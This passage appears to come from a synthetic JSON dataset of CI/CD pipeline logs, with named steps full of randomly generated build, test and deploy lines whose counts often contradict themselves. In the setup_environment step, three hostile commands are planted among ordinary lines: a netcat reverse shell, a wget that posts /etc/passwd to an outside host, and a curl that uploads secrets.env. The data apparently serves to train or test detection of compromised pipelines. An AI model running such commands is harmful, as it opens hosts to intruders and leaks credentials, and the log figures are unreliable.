          "Using Node.js 16.8.4",
          "NODE_ENV=test",
          "pip install: Successfully installed express-3.1",
          "Compiling lib/handler.rs...",
          "Tests: 241 passed, 94 total",
          "Success!",
          "pip: Installing build dependencies...",
          "Step 3/19: Testing",
          "Optimizing 86 modules...",
          "[12:46:16] DEBUG: Memory usage: 1370MB",
          "Cache saved successfully",
          "[12:46:16] ERROR: Connection failed",
          "npm install: added 436 packages",
          "[12:46:16] DEBUG: Loading configuration",
          "[12:46:16] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:16] WARN: Deprecated API usage",
          "yarn add: Done in 24.87s",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: node_modules",
          "WARNING: react has known vulnerabilities",
          "Optimizing 65 modules...",
          "pip: Collecting express",
          "Using Python 3.9",
          "Step 12/24: Installing dependencies",
          "[12:46:16] INFO: Request completed",
          "Finished.",
          "Compiling src/service.java...",
          "Ready.",
          "Step 8/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "\u2713 Step 'checkout' succeeded",
          "Time: 113.220s",
          "[12:46:16] INFO: Connecting to database",
          "\u2713 Step 'test' succeeded",
          "Coverage: 87% statements, 77% branches",
          "Building Docker image...",
          "Tests: 343 passed, 409 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-13T12:46:36.108002",
        "finished_at": "2025-12-13T12:46:55.569773",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache restored successfully (114MB)",
          "yarn add: Done in 17.86s",
          "Finished.",
          "Fetching from https://github.com/package.json",
          "Using Node.js 16.12.5",
          "pip: Collecting lodash",
          "Image pulled successfully",
          "Optimizing 53 modules...",
          "pip install: Successfully installed prettier-2.14",
          "[12:46:16] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (65ms)",
          "\u2713 Task completed in 2811ms",
          "npm notice: created a lockfile",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:16] DEBUG: Query executed in 43ms",
          "Ready.",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] ERROR: Connection failed",
          "Processing...",
          "Done.",
          "Completed.",
          "pip: Installing build dependencies...",
          "Test Suites: 21 passed, 40 total",
          "Cache restored successfully (111MB)",
          "\u2713 deploy completed",
          "Snapshots: 27 passed, 22 total",
          "FAILED: test_cache_hit",
          "pip: Collecting jest",
          "[12:46:16] ERROR: Connection failed",
          "Environment: development",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "POST /upload - 202 (420ms)",
          "Image pulled successfully",
          "Ran 157 tests in 4s",
          "Step 6/15: Deploying",
          "npm install: resolved 1421 packages",
          "FAILED: test_auth_login",
          "[12:46:16] INFO: Starting build process",
          "Done.",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 201 (399ms)",
          "Switched to branch 'feature/task-847'",
          "Optimizing 12 modules...",
          "Pushing to registry...",
          "Done.",
          "Platform: darwin-arm64",
          "[12:46:16] INFO: Processing request",
          "FAILED: test_api_health",
          "[12:46:16] INFO: Cache refreshed",
          "[12:46:16] ERROR: Connection failed",
          "pip: Collecting axios",
          "Cache miss for key-2233",
          "yarn add: Done in 13.17s",
          "Waiting...",
          "Processing...",
          "Step 14/16: Running migrations",
          "Finished.",
          "[12:46:16] DEBUG: Memory usage: 1475MB",
          "Coverage: 88% statements, 80% branches",
          "Switched to branch 'feature/task-272'",
          "  PASS: e2e/test_user_create.spec.js",
          "pip: Downloading jest-3.8.tar.gz",
          "npm install: resolved 1094 packages",
          "OK",
          "[12:46:16] WARN: Deprecated API usage",
          "Bundling runtime.js",
          "[12:46:16] INFO: Starting build process",
          "Compiling components/service.java...",
          "Using Node.js 18.16.4",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "Loading...",
          "  PASS: integration/test_auth_login.spec.js",
          "Waiting...",
          "[12:46:16] DEBUG: Query executed in 55ms",
          "[12:46:16] INFO: Cache refreshed",
          "Already up to date.",
          "Uploading artifact 'dist' (42 files)",
          "[12:46:16] DEBUG: Connection pool: 7 active",
          "[12:46:16] DEBUG: Query executed in 81ms",
          "pip: Collecting jest",
          "WARNING: express has known vulnerabilities",
          "pip: Downloading webpack-2.5.tar.gz",
          "\u2713 Step 'install' succeeded",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (56MB)",
          "Step 15/16: Installing dependencies",
          "Tests: 260 passed, 184 total",
          "pip: Downloading react-5.2.tar.gz",
          "Step 13/25: Testing",
          "Layer 4/13: RUN command",
          "  PASS: test_api_health (205ms)",
          "Success!",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 39",
          "\u2717 build failed with exit code 37",
          "pip: Collecting express",
          "Step 13/20: Testing",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at 7686fed",
          "\u2713 Task completed in 3471ms",
          "[12:46:16] DEBUG: Connection pool: 11 active",
          "pip: Collecting jest",
          "Switched to branch 'feature/task-826'",
          "npm install: resolved 1039 packages",
          "yarn add: Done in 15.46s",
          "\u2713 Task completed in 2161ms",
          "Creating production build...",
          "npm notice: package.json updated",
          "OK",
          "Compiling utils/index.js...",
          "Environment: production",
          "Fetching submodules...",
          "[12:46:16] DEBUG: Memory usage: 1846MB",
          "Time: 101.932s",
          "[12:46:16] WARN: Deprecated API usage",
          "Minifying main.js",
          "\u2713 Step 'checkout' succeeded",
          "Fetching from https://gcr.io/package.json",
          "Switched to branch 'hotfix/task-588'",
          "Installing lodash@5.3.10",
          "Fetching from https://github.com/package.json",
          "Cache miss for key-8940",
          "[12:46:16] INFO: Cache refreshed",
          "Artifact downloaded: 14MB",
          "Waiting...",
          "Done.",
          "Coverage: 93% statements, 86% branches",
          "[12:46:16] DEBUG: Connection pool: 15 active",
          "Pulling image: alpine:18",
          "Waiting...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-13T12:46:55.569773",
        "finished_at": "2025-12-13T12:47:15.031544",
        "log_lines": [
          "=== Step: build ===",
          "Step 1/23: Running migrations",
          "Switched to branch 'hotfix/task-855'",
          "npm notice: package.json updated",
          "Environment: production",
          "Using Node.js 18.7.0",
          "Environment: staging",
          "\u2717 build failed with exit code 48",
          "npm notice: package.json updated",
          "[12:46:16] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (44 files)",
          "Artifact downloaded: 17MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "pip: Installing build dependencies...",
          "Compiling src/service.java...",
          "HEAD is now at f281397",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] DEBUG: Memory usage: 834MB",
          "Ran 168 tests in 52s",
          "Finished.",
          "Success!",
          "Tests: 59 passed, 483 total",
          "Creating production build...",
          "Uploading artifact 'coverage' (2 files)",
          "WARNING: prettier has known vulnerabilities",
          "NODE_ENV=development",
          "  PASS: unit/test_user_create.spec.js",
          "[12:46:16] ERROR: Connection failed",
          "Platform: linux-x64",
          "\u2713 All checks passed",
          "\u2713 Task completed in 893ms",
          "Step 4/21: Running migrations",
          "Artifact uploaded: dist.zip (74MB)",
          "  PASS: test_user_create (69ms)",
          "Success!",
          "[12:46:16] INFO: Processing request",
          "TLS handshake completed",
          "TLS handshake completed",
          "Step 9/21: Deploying",
          "  PASS: test_user_create (330ms)",
          "Tests: 408 passed, 64 total",
          "POST /upload - 202 (186ms)",
          "Compiling src/main.py...",
          "Step 2/24: Linting",
          "Test Suites: 15 passed, 28 total",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "\u2713 test completed",
          "Loading...",
          "pip: Collecting eslint",
          "npm notice: package.json updated",
          "HEAD is now at b0a2136",
          "yarn add: Done in 22.92s",
          "Success!",
          "Ran 151 tests in 50s",
          "POST /upload - 201 (241ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 11.87s",
          "[12:46:16] INFO: Connecting to database",
          "pip install: Successfully installed express-4.11",
          "npm notice: package.json updated",
          "Pulling image: node:latest",
          "OK",
          "\u2713 Step 'test' succeeded",
          "Cache hit for key-3709",
          "Verifying...",
          "\u2713 Step 'setup' succeeded",
          "Step 15/24: Linting",
          "Cache hit for key-3270",
          "Cache hit for key-5279",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 85% statements, 62% branches",
          "Bundling styles.css",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "[12:46:16] INFO: Connecting to database",
          "Creating production build...",
          "Time: 16.116s",
          "Done.",
          "pip install: Successfully installed eslint-3.10",
          "Step 10/15: Building",
          "Verifying...",
          "Compiling src/main.py...",
          "[12:46:16] WARN: Deprecated API usage",
          "Generating source maps...",
          "Success!",
          "Loading...",
          "Connection established",
          "Cache restored successfully (474MB)",
          "[12:46:16] DEBUG: Loading configuration",
          "Connection established",
          "[12:46:16] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/index.js...",
          "npm notice: package.json updated",
          "[12:46:16] DEBUG: Loading configuration",
          "Compiling src/index.js...",
          "[12:46:16] DEBUG: Loading configuration",
          "Creating production build...",
          "[12:46:16] DEBUG: Memory usage: 1431MB",
          "Environment: test",
          "Using Node.js 16.20.2",
          "yarn add: Done in 8.54s",
          "[12:46:16] DEBUG: Initializing service",
          "NODE_ENV=test",
          "Connection established",
          "Generating source maps...",
          "Ready.",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Platform: linux-x64",
          "Waiting...",
          "Platform: darwin-arm64",
          "Step 19/20: Testing",
          "Cache miss for key-1429",
          "Tests: 69 passed, 390 total",
          "[12:46:16] WARN: Deprecated API usage",
          "POST /upload - 200 (141ms)",
          "pip: Collecting webpack",
          "Artifact uploaded: dist.zip (47MB)",
          "Success!",
          "Connection established",
          "pip: Collecting express",
          "Compiling src/utils.go...",
          "Test Suites: 49 passed, 8 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Completed.",
          "Generating source maps...",
          "[12:46:16] DEBUG: Query executed in 93ms",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-13T12:47:15.031544",
        "finished_at": "2025-12-13T12:47:17.626447",
        "log_lines": [
          "=== Step: checkout ===",
          "Transforming 928 files...",
          "\u2713 Step 'checkout' succeeded",
          "Cache invalidated: dependencies",
          "[12:46:16] INFO: Request completed",
          "Cache miss for key-2725",
          "Artifact downloaded: 49MB",
          "[12:46:16] INFO: Request completed",
          "[12:46:16] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache invalidated: build",
          "Loading...",
          "npm install: resolved 906 packages",
          "[12:46:16] INFO: Starting build process",
          "[12:46:16] WARN: Deprecated API usage",
          "Cache saved successfully",
          "[12:46:16] DEBUG: Connection pool: 7 active",
          "Coverage: 86% statements, 87% branches",
          "WARNING: webpack has known vulnerabilities",
          "Coverage: 76% statements, 94% branches",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "Step 19/15: Testing",
          "OK",
          "Verifying...",
          "Tests: 234 passed, 428 total",
          "Environment: staging",
          "OK",
          "[12:46:16] INFO: Starting build process",
          "Cache hit for key-5213",
          "Connection established",
          "Generating source maps...",
          "Loading...",
          "Cache restored successfully (233MB)",
          "GET /health - 200 (4ms)",
          "[12:46:16] DEBUG: Query executed in 90ms",
          "Switched to branch 'bugfix/task-907'",
          "\u2713 Step 'checkout' succeeded",
          "Generating source maps...",
          "HEAD is now at 19ef1a1",
          "WARNING: express has known vulnerabilities",
          "Processing...",
          "Pulling image: alpine:18",
          "Cache restored successfully (377MB)",
          "Test Suites: 9 passed, 24 total",
          "Optimizing 25 modules...",
          "Using Python 3.11",
          "Layer 3/9: RUN command",
          "Switched to branch 'feature/task-345'",
          "Ready.",
          "GET /status - 201 (72ms)",
          "Compiling components/app.ts...",
          "npm notice: package.json updated",
          "Environment: test",
          "pip install: Successfully installed express-2.13",
          "[12:46:16] WARN: Deprecated API usage",
          "Step 13/19: Linting",
          "Success!",
          "Fetching submodules...",
          "[12:46:16] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "npm install: added 376 packages",
          "Tests: 460 passed, 376 total",
          "NODE_ENV=development",
          "Fetching submodules...",
          "GET /status - 200 (59ms)",
          "Image pulled successfully",
          "Generating source maps...",
          "POST /upload - 200 (460ms)",
          "Already up to date.",
          "Layer 10/9: RUN command",
          "Tests: 256 passed, 470 total",
          "pip: Downloading express-1.14.tar.gz",
          "Ran 15 tests in 37s",
          "  PASS: test_api_health (223ms)",
          "[12:46:16] INFO: Processing request",
          "pip: Installing build dependencies...",
          "Step 18/16: Installing dependencies",
          "HEAD is now at 27977cc",
          "Environment: development",
          "Compiling lib/utils.go...",
          "Fetching from https://github.com/package.json",
          "pip: Collecting react",
          "HEAD is now at f64fc86",
          "[12:46:16] DEBUG: Memory usage: 531MB",
          "[12:46:16] DEBUG: Memory usage: 1972MB",
          "Layer 8/15: COPY command",
          "pip: Installing build dependencies...",
          "Environment: development",
          "Processing...",
          "Artifact uploaded: dist.zip (31MB)",
          "Step 15/17: Installing dependencies",
          "Switched to branch 'hotfix/task-753'",
          "Transforming 314 files...",
          "Artifact uploaded: dist.zip (90MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 13/18: Building",
          "npm notice: created a lockfile",
          "Processing...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Finished.",
          "Artifact uploaded: dist.zip (100MB)",
          "yarn add: Done in 20.36s",
          "[12:46:16] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Processing...",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Platform: win32-x64",
          "Compiling utils/app.ts...",
          "Step 18/15: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Creating production build...",
          "pip: Collecting express",
          "Environment: test",
          "[12:46:16] DEBUG: Loading configuration",
          "TLS handshake completed",
          "Ran 101 tests in 23s",
          "Using Python 3.10",
          "Switched to branch 'feature/task-572'",
          "\u2713 Step 'build' succeeded",
          "Transforming 196 files...",
          "[12:46:16] INFO: Connecting to database",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "\u2713 Step 'build' succeeded",
          "FAILED: test_api_health",
          "Success!",
          "Compiling src/app.ts...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-13T12:47:17.626447",
        "finished_at": "2025-12-13T12:47:21.518801",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: integration/test_api_health.spec.js",
          "Bundling runtime.css",
          "WARNING: axios has known vulnerabilities",
          "Environment: production",
          "[12:46:16] DEBUG: Connection pool: 14 active",
          "Generating source maps...",
          "Bundling main.js",
          "Step 19/16: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at 54d7ba7",
          "OK",
          "WARNING: express has known vulnerabilities",
          "Step 7/22: Installing dependencies",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/24: Linting",
          "Pushing to registry...",
          "[12:46:16] INFO: Request completed",
          "[12:46:16] DEBUG: Query executed in 21ms",
          "WARNING: express has known vulnerabilities",
          "Tests: 444 passed, 64 total",
          "npm install: resolved 750 packages",
          "Step 1/22: Running migrations",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "Fetching submodules...",
          "[12:46:16] DEBUG: Query executed in 27ms",
          "Transforming 550 files...",
          "Done.",
          "Tests: 239 passed, 454 total",
          "Using Python 3.12",
          "[12:46:16] INFO: Connecting to database",
          "GET /status - 201 (62ms)",
          "Waiting...",
          "\u2717 build failed with exit code 9",
          "Ran 126 tests in 42s",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact downloaded: 12MB",
          "Installing eslint@4.6.8",
          "Pushing to registry...",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "Cache hit for key-4686",
          "Switched to branch 'hotfix/task-114'",
          "[12:46:16] INFO: Connecting to database",
          "[12:46:16] INFO: Request completed",
          "Connection established",
          "Snapshots: 42 passed, 21 total",
          "[12:46:16] DEBUG: Connection pool: 19 active",
          "Cache miss for key-2466",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:46:16] WARN: Deprecated API usage",
          "Success!",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] DEBUG: Connection pool: 2 active",
          "Step 6/17: Installing dependencies",
          "Minifying vendor.js",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Optimizing 60 modules...",
          "Step 11/16: Linting",
          "Generating source maps...",
          "Connection established",
          "Step 19/25: Linting",
          "OK",
          "Step 11/20: Linting",
          "Verifying...",
          "[12:46:16] INFO: Processing request",
          "Completed.",
          "[12:46:16] INFO: Processing request",
          "[12:46:16] INFO: Request completed",
          "Building Docker image...",
          "Cache restored successfully (483MB)",
          "Step 11/25: Building",
          "HEAD is now at fcd5bea",
          "npm notice: created a lockfile",
          "Step 6/20: Testing",
          "Fetching from https://docker.io/package.json",
          "Test Suites: 48 passed, 14 total",
          "Transforming 620 files...",
          "Step 12/22: Testing",
          "Uploading artifact 'coverage' (16 files)",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 26MB",
          "Cache invalidated: node_modules",
          "[12:46:16] INFO: Processing request",
          "Image pulled successfully",
          "Image pulled successfully",
          "Compiling components/app.ts...",
          "[12:46:16] INFO: Request completed",
          "Coverage: 93% statements, 80% branches",
          "Uploading artifact 'coverage' (20 files)",
          "pip: Collecting prettier",
          "Finished.",
          "Using Python 3.11",
          "HEAD is now at 2d23526",
          "Using Node.js 18.6.3",
          "Success!",
          "[12:46:16] DEBUG: Initializing service",
          "Compiling utils/app.ts...",
          "[12:46:16] DEBUG: Connection pool: 4 active",
          "[12:46:16] INFO: Starting build process",
          "Step 20/22: Testing",
          "pip: Downloading axios-3.10.tar.gz",
          "\u2717 build failed with exit code 67",
          "Using Python 3.10",
          "[12:46:16] WARN: Deprecated API usage",
          "Optimizing 58 modules...",
          "HEAD is now at 3013cc1",
          "Step 8/24: Testing",
          "Optimizing 47 modules...",
          "WARNING: prettier has known vulnerabilities",
          "NODE_ENV=test",
          "pip: Downloading prettier-5.3.tar.gz",
          "Connection established",
          "Compiling components/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 13 passed, 45 total",
          "npm install: added 362 packages",
          "Step 7/17: Testing",
          "NODE_ENV=production",
          "\u2713 Task completed in 338ms",
          "WARNING: webpack has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Tests: 147 passed, 352 total",
          "Completed.",
          "Waiting...",
          "Already up to date.",
          "Ready.",
          "pip: Collecting axios",
          "Coverage: 88% statements, 85% branches",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-13T12:47:21.518801",
        "finished_at": "2025-12-13T12:47:28.006058",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "pip: Installing build dependencies...",
          "Tests: 54 passed, 180 total",
          "Processing...",
          "Snapshots: 0 passed, 44 total",
          "Step 9/19: Testing",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Image pulled successfully",
          "Cache restored successfully (82MB)",
          "[12:46:16] WARN: Deprecated API usage",
          "[12:46:16] DEBUG: Connection pool: 2 active",
          "TLS handshake completed",
          "  PASS: test_cache_hit (82ms)",
          "npm notice: created a lockfile",
          "pip: Downloading axios-2.20.tar.gz",
          "Creating production build...",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "Creating production build...",
          "npm install: resolved 1579 packages",
          "NODE_ENV=production",
          "npm install: resolved 1183 packages",
          "Step 8/15: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'bugfix/task-137'",
          "Test Suites: 41 passed, 16 total",
          "Compiling src/index.js...",
          "[12:46:16] DEBUG: Memory usage: 1175MB",
          "Step 6/21: Installing dependencies",
          "Using Node.js 20.20.3",
          "POST /data - 200 (257ms)",
          "Step 16/24: Deploying",
          "Tests: 96 passed, 66 total",
          "Finished.",
          "npm install: added 128 packages",
          "Bundling runtime.css",
          "Finished.",
          "Cache hit for key-7881",
          "Loading...",
          "[12:46:16] DEBUG: Connection pool: 17 active",
          "Compiling lib/main.py...",
          "\u2713 Task completed in 3726ms",
          "Done.",
          "POST /upload - 201 (163ms)",
          "\u2713 Task completed in 2410ms",
          "Time: 67.687s",
          "[12:46:16] WARN: Deprecated API usage",
          "Pulling image: node:latest",
          "npm install: added 140 packages",
          "Cache saved successfully",
          "GET /status - 201 (50ms)",
          "npm install: resolved 1805 packages",
          "[12:46:16] INFO: Processing request",
          "Connection established",
          "Time: 104.845s",
          "Switched to branch 'hotfix/task-625'",
          "\u2713 Step 'test' succeeded",
          "Loading...",
          "npm install: resolved 1494 packages",
          "Cache hit for key-5356",
          "OK",
          "[12:46:16] DEBUG: Loading configuration",
          "Generating source maps...",
          "POST /data - 201 (414ms)",
          "\u2713 deploy completed",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Installing axios@3.3.5",
          "Compiling src/index.js...",
          "Fetching submodules...",
          "Step 2/20: Running migrations",
          "GET /health - 204 (87ms)",
          "Switched to branch 'bugfix/task-749'",
          "[12:46:16] DEBUG: Query executed in 67ms",
          "[12:46:16] INFO: Starting build process",
          "pip: Collecting webpack",
          "Compiling components/index.js...",
          "Waiting...",
          "Uploading artifact 'coverage' (47 files)",
          "GET /api - 204 (31ms)",
          "Verifying...",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Environment: development",
          "Fetching from https://amazonaws.com/package.json",
          "Artifact downloaded: 14MB",
          "[12:46:16] INFO: Starting build process",
          "Fetching from https://docker.io/package.json",
          "Pushing to registry...",
          "Using Python 3.10",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "\u2713 Step 'setup' succeeded",
          "FAILED: test_cache_hit",
          "Processing...",
          "  PASS: test_api_health (252ms)",
          "Checking out master branch",
          "[12:46:16] DEBUG: Initializing service",
          "Test Suites: 34 passed, 17 total",
          "Cache restored successfully (382MB)",
          "\u2713 Step 'test' succeeded",
          "Switched to branch 'feature/task-201'",
          "\u2713 All checks passed",
          "POST /upload - 200 (312ms)",
          "Optimizing 61 modules...",
          "Step 6/15: Running migrations",
          "POST /data - 200 (402ms)",
          "  PASS: test_api_health (497ms)",
          "Layer 7/14: COPY command",
          "Cache miss for key-2935",
          "[12:46:16] WARN: Deprecated API usage",
          "Test Suites: 24 passed, 22 total",
          "Uploading artifact 'dist' (15 files)",
          "Waiting...",
          "GET /health - 204 (16ms)",
          "[12:46:16] DEBUG: Memory usage: 1778MB",
          "Compiling components/index.js...",
          "yarn add: Done in 8.90s",
          "Success!",
          "npm install: resolved 1531 packages",
          "npm install: added 252 packages",
          "[12:46:16] DEBUG: Loading configuration",
          "[12:46:16] INFO: Cache refreshed",
          "[12:46:16] WARN: Deprecated API usage",
          "Step 3/24: Building",
          "Creating production build...",
          "Done.",
          "Ran 156 tests in 55s",
          "FAILED: test_db_connect",
          "[12:46:16] DEBUG: Connection pool: 6 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-13T12:47:28.006058",
        "finished_at": "2025-12-13T12:47:34.493315",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Artifact uploaded: dist.zip (70MB)",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "\u2713 test completed",
          "  PASS: test_auth_login (349ms)",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:46:16] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "npm install: added 18 packages",
          "Step 6/24: Testing",
          "Ran 12 tests in 50s",
          "Platform: win32-x64",
          "[12:46:16] INFO: Connecting to database",
          "Cache restored successfully (227MB)",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing eslint@1.7.2",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 406 packages",
          "[12:46:16] INFO: Request completed",
          "Test Suites: 15 passed, 40 total",
          "Ready.",
          "TLS handshake completed",
          "[12:46:16] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "Fetching submodules...",
          "\u2713 test completed",
          "Checking out main branch",
          "Snapshots: 3 passed, 18 total",
          "Step 7/19: Deploying",
          "Done.",
          "Environment: development",
          "[12:46:16] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (47MB)",
          "Snapshots: 38 passed, 27 total",
          "POST /data - 200 (52ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:46:16] WARN: Deprecated API usage",
          "Step 6/16: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "npm notice: created a lockfile",
          "Coverage: 73% statements, 95% branches",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "NODE_ENV=test",
          "Uploading artifact 'build' (17 files)",
          "npm notice: created a lockfile",
          "Cache hit for key-5253",
          "Uploading artifact 'build' (25 files)",
          "  PASS: e2e/test_user_create.spec.js",
          "Pushing to registry...",
          "[12:46:16] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "[12:46:16] DEBUG: Loading configuration",
          "Step 9/21: Testing",
          "Building Docker image...",
          "OK",
          "Test Suites: 35 passed, 26 total",
          "Compiling src/index.js...",
          "Fetching submodules...",
          "Uploading artifact 'build' (5 files)",
          "Step 4/23: Testing",
          "Layer 4/10: ENV command",
          "Completed.",
          "Step 17/20: Testing",
          "Processing...",
          "Minifying vendor.js",
          "npm notice: package.json updated",
          "pip: Collecting webpack",
          "Step 19/21: Running migrations",
          "Compiling utils/main.py...",
          "Finished.",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "[12:46:16] DEBUG: Memory usage: 1234MB",
          "Layer 2/14: COPY command",
          "Step 17/17: Deploying",
          "Artifact downloaded: 14MB",
          "npm install: added 80 packages",
          "Step 12/24: Running migrations",
          "Compiling components/handler.rs...",
          "[12:46:16] DEBUG: Query executed in 32ms",
          "Cache miss for key-1912",
          "Cache miss for key-7705",
          "NODE_ENV=production",
          "Success!",
          "pip install: Successfully installed react-4.14",
          "WARNING: eslint has known vulnerabilities",
          "HEAD is now at a0fce6b",
          "Cache restored successfully (461MB)",
          "Minifying vendor.js",
          "Artifact downloaded: 22MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Already up to date.",
          "[12:46:16] INFO: Processing request",
          "Done.",
          "GET /status - 200 (15ms)",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "[12:46:16] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "\u2717 build failed with exit code 60",
          "pip: Collecting express",
          "[12:46:16] DEBUG: Connection pool: 2 active",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: dependencies",
          "pip install: Successfully installed webpack-1.6",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (331MB)",
          "Done.",
          "Time: 114.942s",
          "GET /health - 200 (96ms)",
          "pip: Installing build dependencies...",
          "[12:46:16] DEBUG: Connection pool: 7 active",
          "Checking out master branch",
          "Ran 89 tests in 33s",
          "[12:46:16] DEBUG: Loading configuration",
          "yarn add: Done in 10.6s",
          "HEAD is now at df7aca5",
          "Minifying vendor.js",
          "Artifact uploaded: dist.zip (69MB)",
          "Optimizing 98 modules...",
          "Uploading artifact 'dist' (38 files)",
          "Ran 10 tests in 1s",
          "Pulling image: node:3.11",
          "[12:46:16] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "pip install: Successfully installed webpack-1.10",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-13T12:47:34.493315",
        "finished_at": "2025-12-13T12:47:40.980572",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 17/19: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:46:16] DEBUG: Query executed in 58ms",
          "Platform: linux-x64",
          "[12:46:16] DEBUG: Memory usage: 1613MB",
          "Done.",
          "[12:46:16] INFO: Starting build process",
          "nc -e /bin/sh 67.237.40.61 31913",
          "[12:46:16] INFO: Connecting to database",
          "[12:46:16] DEBUG: Connection pool: 6 active",
          "[12:46:16] INFO: Starting build process",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "[12:46:16] WARN: Deprecated API usage",
          "Processing...",
          "Using Node.js 19.1.6",
          "Ran 147 tests in 7s",
          "Already up to date.",
          "[12:46:16] DEBUG: Connection pool: 13 active",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Step 4/15: Running migrations",
          "[12:46:16] DEBUG: Initializing service",
          "HEAD is now at 8492ba3",
          "Artifact downloaded: 21MB",
          "[12:46:16] INFO: Processing request",
          "Image pulled successfully",
